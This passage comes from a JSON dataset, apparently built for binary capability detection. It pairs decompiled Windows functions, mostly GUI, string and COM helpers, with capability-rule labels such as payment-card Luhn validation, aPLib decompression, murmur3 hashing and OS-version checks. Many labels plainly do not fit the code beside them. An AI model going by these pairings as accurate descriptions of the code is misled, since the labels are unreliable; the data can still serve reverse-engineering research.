fcn.0042b7b9();\n        iVar2 = (*_sym.imp.SHELL32.dll_ExtractIconA)();\n        if (iVar2 != 0) {\n            (*_sym.imp.USER32.dll_DestroyIcon)();\n        }\n    }\n    fcn.00411180();\n    fcn.00453d1d();\n    fcn.00453d1d();\n    fcn.00423280();\n    fcn.00401680();\n    pcVar1 = *(unaff_EBP + 0x24);\n    *(unaff_EBP + -4) = 2;\n    if ((pcVar1 == NULL) || (*pcVar1 == '\\0')) {\n        fcn.00402280();\n        iVar2 = fcn.00438007();\n        if (iVar2 != -1) {\n            fcn.00438211(unaff_EBP + 0x20, iVar2 + 1);\n            *(unaff_EBP + -4) = 3;\n            fcn.00402200();\n            *(unaff_EBP + -4) = 2;\n            fcn.004010d0();\n            iVar2 = fcn.00438007();\n            if (iVar2 != -1) {\n                fcn.00438211(unaff_EBP + 0x20, iVar2);\n                *(unaff_EBP + -4) = 4;\n                fcn.00402200();\n                *(unaff_EBP + -4) = 2;\n                fcn.004010d0();\n                iVar2 = fcn.00438007();\n                if (iVar2 != -1) {\n                    var_4h = fcn.00410fe0(unaff_EBP + 0x20);\n                    *(unaff_EBP + -4) = 5;\n                    fcn.00402200(var_4h);\n                    fcn.004010d0();\n                    goto code_r0x004542af;\n                }\n            }\n        }\n        fcn.004016d0();\n    }\n    else {\n        fcn.00402280();\n        var_4h = pcVar1;\n    }\ncode_r0x004542af:\n    fcn.00453d1d(8, *(unaff_EBP + 0xc), var_4h);\n    fcn.004010d0();\n    fcn.004010d0();\n    fcn.004010d0();\ncode_r0x004542da:\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 1040
    },
    "004550ec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004550ec(uint arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_34h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint var_4h;\n    \n    puVar1 = arg_ch;\n    puVar3 = &var_34h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    if (((var_14h == 0) && (var_10h != 0xffffffff)) && (var_10h != NULL)) {\n        iVar2 = fcn.00453a58(var_10h, &var_4h);\n        if (iVar2 == 0) {\n            puVar1 = fcn.00453c51(var_10h);\n            *puVar1 = 0;\n        }\n        arg_ch = NULL;\n        fcn.00453a7f(var_10h, &arg_ch);\n        var_10h = arg_ch;\n    }\n    (**(*in_ECX + 0x110))(0x404, arg_8h, &var_34h);\n    return;\n}\n",
        "token_count": 324
    },
    "0044b595": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044b595(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t var_4h;\n    \n    if ((arg_10h & 0x4000) != 0) {\n        arg_10h = arg_10h & 0xffffbfff | 0x40;\n    }\n    if (arg_10h == 8) {\n        arg_10h = 0xe;\n    }\n    var_4h = arg_10h & 0xff;\n    fcn.0044af79(arg_ch, (arg_10h == 9) * 4 + 4, 0, 0, &var_4h, &arg_14h);\n    return;\n}\n",
        "token_count": 177
    },
    "004552d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004552d8(int32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_24h;\n    int32_t var_20h;\n    uint32_t var_18h;\n    uint var_10h;\n    uint32_t lpPoint;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    puVar3 = arg_ch;\n    puVar4 = &var_24h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_24h = (*_sym.imp.USER32.dll_SendMessageA)(*(arg_8h + 0x20), 0x410, 0, &var_10h);\n    lpPoint = arg_ch[5];\n    var_4h = arg_ch[6];\n    if (var_20h - 0x200U < 10) {\n        (*_sym.imp.USER32.dll_ScreenToClient)(var_24h, &lpPoint);\n    }\n    var_18h = lpPoint & 0xffff | var_4h << 0x10;\n    (*pcVar1)(*(arg_8h + 0x20), 0x407, 0, &var_24h);\n    return;\n}\n",
        "token_count": 360
    },
    "00420977": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl\nfcn.00420977(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    bool bVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h != 0) {\n        iVar1 = fcn.0043231e(arg_10h, 0xffffffff);\n        if (iVar1 == 0) {\n            fcn.0041901a();\n        }\n    }\n    var_4h = arg_8h;\n    var_8h = arg_ch;\n    var_10h = arg_14h;\n    var_14h = arg_18h;\n    var_18h = arg_1ch;\n    var_1ch = arg_20h;\n    var_20h = arg_24h;\n    var_24h = arg_28h;\n    var_ch = arg_10h;\n    var_28h = arg_2ch;\n    iVar1 = fcn.0042b7b9();\n    var_2ch = *(iVar1 + 8);\n    var_30h = arg_30h;\n    iVar1 = (**(*in_ECX + 100))(&var_30h);\n    if (iVar1 == 0) {\n        (**(*in_ECX + 0x114))();\n        bVar3 = false;\n    }\n    else {\n        fcn.00420922();\n        iVar1 = fcn.0041cbaf(var_4h, var_8h, var_ch, var_10h, var_14h, var_18h, var_1ch, var_20h, var_24h, var_28h, \n                             var_2ch, var_30h);\n        iVar2 = fcn.0041e726();\n        if (iVar2 == 0) {\n            (**(*in_ECX + 0x114))();\n        }\n        bVar3 = iVar1 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 582
    },
    "0043b701": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043b701(uint arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    var_18h = 0;\n    var_1ch = 2;\n    var_14h = *arg_ch;\n    uStack20 = arg_ch[1];\n    uStack16 = arg_ch[2];\n    uStack12 = arg_ch[3];\n    fcn.0043b5c4(arg_8h, arg_ch, &var_1ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch, \n                 arg_30h);\n    fcn.004566a8(arg_10h);\n    return;\n}\n",
        "token_count": 330
    },
    "00440dc6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __cdecl fcn.00440dc6(uint *arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_30h;\n    uint *var_2ch;\n    int32_t *var_28h;\n    int32_t var_24h;\n    int32_t *var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    var_2ch = arg_10h;\n    if ((arg_8h != NULL) && (arg_10h != NULL)) {\n        var_28h = NULL;\n        var_24h = (***arg_8h)(arg_8h, 0x48f6b4, &var_28h);\n        uVar1 = arg_14h;\n        if (arg_14h != 0) {\n            for (; uVar1 != 0; uVar1 = uVar1 - 1) {\n                *arg_10h = 0;\n                arg_10h = arg_10h + 1;\n            }\n        }\n        if (-1 < var_24h) {\n            var_1ch = arg_ch;\n            var_18h = arg_14h;\n            var_14h = *0x4979c8;\n            uStack20 = *0x4979cc;\n            uStack16 = *0x4979d0;\n            var_30h = 0;\n            var_20h = NULL;\n            uStack12 = *0x4979d4;\n            var_24h = (**(*var_28h + 0xc))(var_28h, 1, &var_1ch, &var_30h, &var_20h);\n            if (-1 < var_24h) {\n                uVar1 = 0;\n                iVar3 = 0;\n                while( true ) {\n                    uVar2 = var_20h[1];\n                    if (arg_14h <= var_20h[1]) {\n                        uVar2 = arg_14h;\n                    }\n                    if (uVar2 <= uVar1) break;\n                    var_2ch[uVar1] = *(*var_20h + 0x2c + iVar3);\n                    uVar1 = uVar1 + 1;\n                    iVar3 = iVar3 + 0x34;\n                }\n                if (*var_20h != 0) {\n                    (*_sym.imp.ole32.dll_CoTaskMemFree)(*var_20h);\n                }\n            }\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(var_20h);\n        }\n        if (var_28h != NULL) {\n            (**(*var_28h + 8))(var_28h);\n        }\n    }\n    fcn.004566a8(var_30h);\n    return;\n}\n",
        "token_count": 722
    },
    "00455414": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00455414(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_30h;\n    \n    fcn.00455285(&var_30h, arg_8h, arg_ch);\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x405, 0, &var_30h);\n    return;\n}\n",
        "token_count": 98
    },
    "00455477": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00455477(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    \n    fcn.00455285(&var_30h, arg_8h, arg_ch);\n    uVar1 = fcn.00456177(&var_20h, 0x10, arg_10h, 0x10);\n    fcn.0040e7f0(uVar1);\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x406, 0, &var_30h);\n    return;\n}\n",
        "token_count": 163
    },
    "00432e4a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432e4a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint extraout_ECX;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_4h;\n    int32_t iVar5;\n    \n    iVar5 = 0x14;\n    fcn.00458e78(0x14);\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    iVar3 = *(unaff_EBP + 0xc);\n    iVar4 = 0;\n    if (iVar3 < 0) {\n        iVar3 = -iVar3;\n    }\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 != 0) {\n        *(unaff_EBP + -4) = 0;\n        for (; *(unaff_EBP + -0x18) = iVar4,  iVar4 < iVar3; iVar4 = iVar4 + 1) {\n            iVar5 = unaff_EBP + -0x11;\n            fcn.00432a06();\n            cVar2 = *(unaff_EBP + -0x11);\n            if (cVar2 == '\\n') {\ncode_r0x00432ea5:\n                if (*(unaff_EBP + 0xc) != iVar3) {\n                    *(iVar4 + iVar1) = cVar2;\n                    iVar4 = iVar4 + 1;\n                }\n                break;\n            }\n            if (cVar2 == '\\r') {\n                iVar5 = unaff_EBP + -0x11;\n                fcn.00432a06();\n                cVar2 = *(unaff_EBP + -0x11);\n                goto code_r0x00432ea5;\n            }\n            *(iVar4 + iVar1) = cVar2;\n        }\n        *(iVar4 + iVar1) = 0;\n    }\n    fcn.00458f1d(iVar5);\n    return;\n}\n",
        "token_count": 471
    },
    "00433528": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433528(int32_t arg_8h, uint arg_ch)\n\n{\n    ushort *in_ECX;\n    \n    if (arg_ch == 10) {\n        *in_ECX = 10;\n    }\n    else {\n        if (arg_ch == 0xb) {\n            *in_ECX = 0xb;\n            in_ECX[4] = -(arg_8h != 0);\n            return;\n        }\n        if (arg_ch == 0x16) {\n            *in_ECX = 0x16;\n        }\n        else if (arg_ch == 0x17) {\n            *in_ECX = 0x17;\n        }\n        else if (arg_ch == 0x19) {\n            *in_ECX = 0x19;\n        }\n        else if (arg_ch == 0x13) {\n            *in_ECX = 0x13;\n        }\n        else {\n            *in_ECX = 3;\n        }\n    }\n    *(in_ECX + 4) = arg_8h;\n    return;\n}\n",
        "token_count": 236
    },
    "0045306c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045306c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint uVar5;\n    uint lprcDst;\n    int32_t lprcSrc1;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t lprcSrc2;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = arg_8h - *(in_ECX + 4);\n    iVar4 = arg_ch - *(in_ECX + 8);\n    iVar3 = *(in_ECX + 0x8c);\n    uVar5 = 2;\n    if (iVar3 == 10) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + iVar2;\n    }\n    else {\n        if (iVar3 != 0xb) {\n            uVar5 = 0x22;\n            if (iVar3 == 0xc) {\n                *(in_ECX + 0x2c) = *(in_ECX + 0x2c) + iVar4;\n            }\n            else {\n                *(in_ECX + 0x34) = *(in_ECX + 0x34) + iVar4;\n            }\n            iVar3 = *(in_ECX + 0x34) - *(in_ECX + 0x2c);\n            goto code_r0x004530c4;\n        }\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + iVar2;\n    }\n    iVar3 = *(in_ECX + 0x30) - *(in_ECX + 0x28);\ncode_r0x004530c4:\n    if (iVar3 < 0) {\n        iVar3 = 0;\n    }\n    (**(**(in_ECX + 0x68) + 0x138))(&var_8h, iVar3, uVar5);\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    lprcSrc1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x4c);\n    var_24h = (*pcVar1)(0x4d);\n    var_20h = (*pcVar1)(0x4e);\n    var_20h = var_20h + lprcSrc1;\n    var_1ch = (*pcVar1)(0x4f);\n    var_1ch = var_1ch + var_24h;\n    lprcSrc2 = *(in_ECX + 0x48);\n    var_14h = *(in_ECX + 0x4c);\n    var_10h = *(in_ECX + 0x50);\n    var_ch = *(in_ECX + 0x54);\n    if ((*(in_ECX + 0x8c) == 10) || (*(in_ECX + 0x8c) == 0xc)) {\n        lprcSrc2 = ((*(in_ECX + 0x58) - *(in_ECX + 0x60)) - var_8h) + var_10h;\n        var_14h = ((*(in_ECX + 0x5c) - *(in_ECX + 100)) - var_4h) + var_ch;\n        iVar3 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcDst, &lprcSrc1, &lprcSrc2);\n        if (iVar3 != 0) {\n            *(in_ECX + 0x38) = *(in_ECX + 0x40) - var_8h;\n            *(in_ECX + 0x3c) = *(in_ECX + 0x44) - var_4h;\n            *(in_ECX + 0x48) = lprcSrc2;\n            *(in_ECX + 0x4c) = var_14h;\n        }\n    }\n    else {\n        var_10h = (*(in_ECX + 0x60) - *(in_ECX + 0x58)) + lprcSrc2 + var_8h;\n        var_ch = (*(in_ECX + 100) - *(in_ECX + 0x5c)) + var_14h + var_4h;\n        iVar3 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcDst, &lprcSrc1, &lprcSrc2);\n        if (iVar3 != 0) {\n            *(in_ECX + 0x40) = *(in_ECX + 0x38) + var_8h;\n            *(in_ECX + 0x44) = *(in_ECX + 0x3c) + var_4h;\n            *(in_ECX + 0x50) = var_10h;\n            *(in_ECX + 0x54) = var_ch;\n        }\n    }\n    *(in_ECX + 4) = arg_8h;\n    *(in_ECX + 8) = arg_ch;\n    fcn.00452e5d(0);\n    return;\n}\n",
        "token_count": 1205
    },
    "00412e00": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00412e00(uchar param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBX;\n    int32_t *unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    int32_t iVar5;\n    int32_t in_stack_ffffffbc;\n    int32_t iVar6;\n    uint32_t uStack56;\n    uint uStack36;\n    uchar uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4838c0;\n    piStack12 = *in_FS_OFFSET;\n    uStack56 = *0x4a9ec8 ^ &stack0xffffffcc;\n    *in_FS_OFFSET = &piStack12;\n    uStack28 = 0;\n    uStack24 = 0;\n    uStack20 = 0;\n    fcn.00402f40();\n    uStack8 = 0;\n    fcn.00410e90();\n    fcn.004022c0();\n    if (*(unaff_EBX + -0xc) < 1) goto code_r0x00412fb5;\n    iVar5 = unaff_EBX;\n    iVar2 = fcn.00457b92(unaff_EBX, 0x48ad48);\n    in_stack_ffffffbc = unaff_EBX;\n    if ((iVar2 == 0) || (iVar2 = iVar2 - iVar5,  iVar2 < 1)) goto code_r0x00412fb5;\n    in_stack_ffffffbc = 0;\n    iVar6 = iVar2;\n    fcn.00410f30(&uStack36);\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    uStack36 = fcn.00456bfd(unaff_ESI);\n    iVar5 = iVar2 + 1;\n    if ((iVar5 < 0) || (*(unaff_EDI + -0xc) < iVar5)) {\ncode_r0x00412ee1:\n        iVar3 = -1;\n    }\n    else {\n        iVar3 = fcn.00457b92(unaff_EDI + iVar5, 0x48ad48);\n        if (iVar3 == 0) goto code_r0x00412ee1;\n        iVar3 = iVar3 - unaff_EDI;\n    }\n    if (iVar2 < iVar3) {\n        uVar4 = fcn.00410f30(&stack0xffffffd8, iVar5, (iVar3 - iVar2) + -1);\n        uStack32 = 2;\n        fcn.00402200(uVar4);\n        uStack36 = CONCAT31(uStack36._1_3_, 1);\n        piVar1 = uStack56 - 4;\n        LOCK();\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        unaff_ESI = iVar6;\n        if (iVar2 == 1 || iVar2 + -1 < 0) {\n            (**(**(uStack56 - 0x10) + 4))(uStack56 - 0x10);\n            unaff_ESI = iVar6;\n        }\n        uStack56 = fcn.00456bfd(unaff_ESI);\n        if (iVar3 < *(in_stack_ffffffbc + -0xc)) {\n            uVar4 = fcn.00410f30(&stack0xffffffd0, iVar3 + 1, (*(in_stack_ffffffbc + -0xc) - iVar3) + -1);\n            fcn.00402200(uVar4);\n            unaff_ESI = iVar5;\n            fcn.00401900();\n            fcn.00456bfd(unaff_ESI);\n        }\n    }\n    uStack36 = uStack36 & 0xffffff00;\n    piVar1 = unaff_ESI + -4;\n    LOCK();\n    iVar5 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar5 + -1 < 1) {\n        (**(**(unaff_ESI + -0x10) + 4))(unaff_ESI + -0x10);\n    }\ncode_r0x00412fb5:\n    uStack36 = 0xffffffff;\n    piVar1 = in_stack_ffffffbc + -4;\n    LOCK();\n    iVar5 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar5 == 1 || iVar5 + -1 < 0) {\n        (**(**(in_stack_ffffffbc + -0x10) + 4))(in_stack_ffffffbc + -0x10);\n    }\n    *in_FS_OFFSET = unaff_EBP;\n    return CONCAT21(CONCAT11(param_1, uStack56), unaff_EDI);\n}\n",
        "token_count": 1137
    },
    "00463890": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t * fcn.00463890(uint32_t *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    \n    cVar3 = *param_2;\n    if (cVar3 == '\\0') {\n        return param_1;\n    }\n    if (param_2[1] == '\\0') {\n        uVar4 = param_1 & 3;\n        while (uVar4 != 0) {\n            if (*param_1 == cVar3) {\n                return param_1;\n            }\n            if (*param_1 == '\\0') {\n                return NULL;\n            }\n            uVar4 = param_1 + 1 & 3;\n            param_1 = param_1 + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar4 = *param_1;\n                uVar9 = uVar4 ^ CONCAT22(CONCAT11(cVar3, cVar3), CONCAT11(cVar3, cVar3));\n                uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;\n                puVar10 = param_1 + 1;\n                if (((uVar9 ^ 0xffffffff ^ uVar9 + 0x7efefeff) & 0x81010100) != 0) break;\n                param_1 = puVar10;\n                if ((uVar7 & 0x81010100) != 0) {\n                    if ((uVar7 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar4 = *param_1;\n            if (uVar4 == cVar3) {\n                return param_1;\n            }\n            if (uVar4 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 8;\n            if (cVar6 == cVar3) {\n                return param_1 + 1;\n            }\n            if (cVar6 == '\\0') break;\n            cVar6 = uVar4 >> 0x10;\n            if (cVar6 == cVar3) {\n                return param_1 + 2;\n            }\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 0x18;\n            if (cVar6 == cVar3) {\n                return param_1 + 3;\n            }\n            param_1 = puVar10;\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    do {\n        cVar6 = *param_1;\n        do {\n            while (puVar10 = param_1,  param_1 = puVar10 + 1,  cVar6 != cVar3) {\n                if (cVar6 == '\\0') {\n                    return NULL;\n                }\n                cVar6 = *param_1;\n            }\n            cVar6 = *param_1;\n            pcVar8 = param_2;\n            puVar5 = puVar10;\n        } while (cVar6 != param_2[1]);\n        do {\n            if (pcVar8[2] == '\\0') {\n                return puVar10;\n            }\n            if (*(puVar5 + 2) != pcVar8[2]) break;\n            pcVar1 = pcVar8 + 3;\n            if (*pcVar1 == '\\0') {\n                return puVar10;\n            }\n            pcVar2 = puVar5 + 3;\n            pcVar8 = pcVar8 + 2;\n            puVar5 = puVar5 + 2;\n        } while (*pcVar1 == *pcVar2);\n    } while( true );\n}\n",
        "token_count": 922
    },
    "00417300": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00417300(int32_t param_1, ushort param_2, ushort param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x1a9, 0);\n    *CONCAT22(param_3, param_2) = uVar1 >> 0x10 != 0;\n    return uVar1 & 0xffff;\n}\n",
        "token_count": 113
    },
    "0041e59c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.0041e59c(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uStack16;\n    \n    iVar2 = fcn.00431568(0x419034);\n    if (iVar2 == 0) {\n        uStack16 = 0x4a8690;\n        fcn.00456b8d(&uStack16, 0x49ed44);\n        pcVar1 = swi(3);\n        iVar2 = (*pcVar1)();\n        return iVar2;\n    }\n    uVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n    *(iVar2 + 0x68) = uVar3;\n    uVar3 = (*_sym.imp.USER32.dll_GetMessagePos)();\n    *(iVar2 + 0x70) = uVar3 >> 0x10;\n    *(iVar2 + 0x6c) = uVar3;\n    return iVar2 + 0x58;\n}\n",
        "token_count": 222
    },
    "0041fe47": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fe47(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_4h;\n    \n    uVar3 = arg_8h & 0xffff;\n    arg_8h = arg_8h >> 0x10;\n    if (arg_ch == 0) {\n        if (uVar3 == 0) {\n            return 0;\n        }\n        fcn.0041c36c();\n        var_28h = uVar3;\n        (**(*in_ECX + 0xc))(uVar3, 0xffffffff, &var_2ch, 0);\n        if (var_4h != 0) {\n            arg_8h = 0;\ncode_r0x0041feca:\n            uVar2 = (**(*in_ECX + 0xc))(uVar3, arg_8h, 0, 0);\n            return uVar2;\n        }\n    }\n    else {\n        iVar1 = fcn.00431568(0x419034);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0041901a();\n        }\n        if ((*(iVar1 + 0xdc) != in_ECX[8]) && (iVar1 = fcn.0041f2f7(arg_ch, 0),  iVar1 == 0)) {\n            if (uVar3 == 0) {\n                return 0;\n            }\n            goto code_r0x0041feca;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 386
    },
    "00422267": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.00422267(void)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iStack148;\n    int32_t iStack140;\n    uchar auStack136 [12];\n    uchar auStack124 [116];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ auStack124;\n    uVar3 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    iVar6 = uVar3;\n    iStack148 = uVar3 >> 0x10;\n    if ((4 < iVar6) && (5 < iStack148)) {\n        if (0x20 < iVar6) {\n            iVar6 = 0x20;\n        }\n        iVar8 = iVar6 + 0xf >> 4;\n        iVar9 = ((iVar6 + -4) / 2 + iVar8 * 0x10) - iVar6;\n        if (0xc < iVar9) {\n            iVar9 = 0xc;\n        }\n        if (0x20 < iStack148) {\n            iStack148 = 0x20;\n        }\n        fcn.00459330(auStack136);\n        puVar4 = auStack136 + (iStack148 + -6 >> 1) * iVar8 * 2;\n        puVar5 = 0x48c6bc;\n        iStack140 = 5;\n        do {\n            uVar1 = *puVar5;\n            puVar5 = puVar5 + 1;\n            uVar7 = ~(uVar1 << (iVar9 & 0x1f));\n            *puVar4 = uVar7 >> 8;\n            puVar4[1] = uVar7;\n            puVar4 = puVar4 + iVar8 * 2;\n            iStack140 = iStack140 + -1;\n        } while (iStack140 != 0);\n        uVar3 = 1;\n        *0x4ad248 = (*_sym.imp.GDI32.dll_CreateBitmap)(iVar6, iStack148, 1);\n        if (*0x4ad248 == 0) {\n            *0x4ad248 = (*_sym.imp.USER32.dll_LoadBitmapA)(0, 0x7fe3);\n        }\n        fcn.004566a8(uVar3);\n        return;\n    }\n    fcn.00456b8d(&stack0xffffff54, 0x49ed44);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
